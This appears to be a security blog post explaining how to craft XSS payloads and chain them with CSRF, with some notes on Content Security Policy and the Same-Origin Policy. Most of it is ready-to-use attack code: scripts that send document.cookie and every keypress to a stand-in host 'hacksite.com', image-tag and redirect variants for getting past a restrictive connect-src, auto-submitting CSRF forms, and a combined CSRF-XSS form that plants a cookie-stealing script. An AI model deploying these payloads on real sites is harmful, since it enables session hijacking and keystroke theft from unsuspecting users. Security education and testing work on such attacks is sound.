---
title: "CSRF and XSS Chaining"
date: 2025-03-27T10:00:00Z
---

In this blog, I will be discussing on crafting XSS payloads and chaining XSS with CSRF. Cross-site scripting (XSS) and Cross-site Request Forgery(CSRF) are old vulnerability which were part of OWASP top 10. Currently, XSS comes under A3: Injection whereas CSRF is no longer in OWASP top 10, 2021.

There are different ways to defend the web application against XSS attacks implementing all of them gives defense in depth approach where the common goal is to secure web application against XSS attacks. One such approach is having proper Content Security Policy (CSP) header directives.

As a proof of concept, most common payload used in XSS attacks is **alert()** or **prompt()**. But, we can use XSS to exfiltrate sensitive data using **fetch()** or **XMLHttpRequest()**.

```html
<!-- Payload for exfiltrating the cookies -->
<script>
  fetch("//hacksite.com/?cookie=" + btoa(document.cookie));
</script>

<!-- keylogger -->
<script>
  document.onkeypress = (e) => fetch("//hacksite.com/?key=" + btoa(e.key));
</script>
```

It is not always possible to use fetch or XMLHttpRequest directly for
exfiltrating the content, especially when **connect-src** directive is
restrictive. At this point, **document.write()** can be a useful utility with
<img /> HTML tag.

```html
<!-- Payload for exfiltrating the cookies when connect-src is restictive -->
<script>
  document.write(
    '<img src="http://hacksite.com/?cookie=' + document.cookie + '" />'
  );
</script>

<!-- Payload for exfiltrating the cookies with redirection -->

<img
  src="0"
  onerror="document.location"
  ="https://hacksite.com/?cookie="
  +
  encodeURIComponent(document.cookie)
/>
```

Above payload will work when **image-src and script-src** is not restrictive which define from where the images need to be loaded into the website. Above mentioned two payloads will work for following CSP header.

```t
#Insecure CSP Header
Content-Security-Policy: connect-src 'none';
font-src 'none'; frame-src 'none'; img-src 'self';
manifest-src 'none'; media-src 'none'; object-src 'none';
script-src 'unsafe-inline'; style-src 'self';
worker-src 'none'; frame-ancestors 'none'; block-all-mixed-content;

```

Crafting or finding a appropriate payload for XSS depends on CSP policy implemented on the web server. Maintaining a secure CSP policy will give advantage in securing the website from XSS attacks.

You can validate the CSP policy of your website using [Google’s CSP Validator](https://csp-evaluator.withgoogle.com/).

Coming to CSRF, have you ever wondered why always use HTML forms in CSRF payloads. Whatever request we want to send, we can send using fetch(). For example, payload to publish a drafted blog.

```html
<!DOCTYPE html>
<html lang="en">
  <head>
    <title>"CSRF Payload Example"</title>
  </head>
  <body>
    <h1>Sample Page</h1>
    <p>This page contains a fetch request payload.</p>

    <!-- The payload embedded in a script tag -->
    <script>
      fetch("https://blogsite.com/draft/1/publish", {
        method: "GET",
        credentials: "include",
      });
    </script>
  </body>
</html>
```

If you host this page on your local server then on opening this page, script gets executed and publish blog on blogsite.com. **This will not work because of Same Origin Policy (SOP)**.

The **Same-Origin Policy** (SOP) is a security mechanism enforced by web browsers to limit how scripts or resources from one origin can interact with resources from a different origin. An origin is defined by the protocol (e.g., http or https), domain (e.g., example.com), and port (e.g., 80). Due to SOP, JavaScript cannot freely send requests to or process responses from a different origin browsers block this behavior by default. This restriction, enforced at the browser level, helps prevent unauthorized access to sensitive data across websites.

This is one of the reason why HTML form element is used to craft CSRF payloads. Above payload can be sent using HTML forms as below.

```html
<!-- CSRF Payload -->
<html>
  <body>
    <form
      id="csrfForm"
      action="https://blogsite.com/draft/1/publish"
      method="GET"
    ></form>
    <script>
      document.getElementById("csrfForm").submit();
    </script>
  </body>
</html>
```

This payload will work as <form> element is not restricted by SOP to send request to different origin.

Finally, chaining CSRF with XSS to exfiltrate data using the payload below. With this payload, we are drafting a blog with the malicious content (XSS attack) and This draft is created with CSRF attack using html form. This is how we can leverage CSRF to exploit XSS.

```html
<!-- CSRF and XSS chain -->
<html>
  <body onload="document.csrfForm.submit()">
    <form name="csrfForm" action="http://blogsite.com/draft/" method="GET">
      <input
        type="hidden"
        name="msg"
        value="<script>fetch('http://hacksite.com/?cookie='+encodeURIComponent(document.cookie));</script>"
      />
    </form>
  </body>
</html>
```

Thanks and happy hacking !
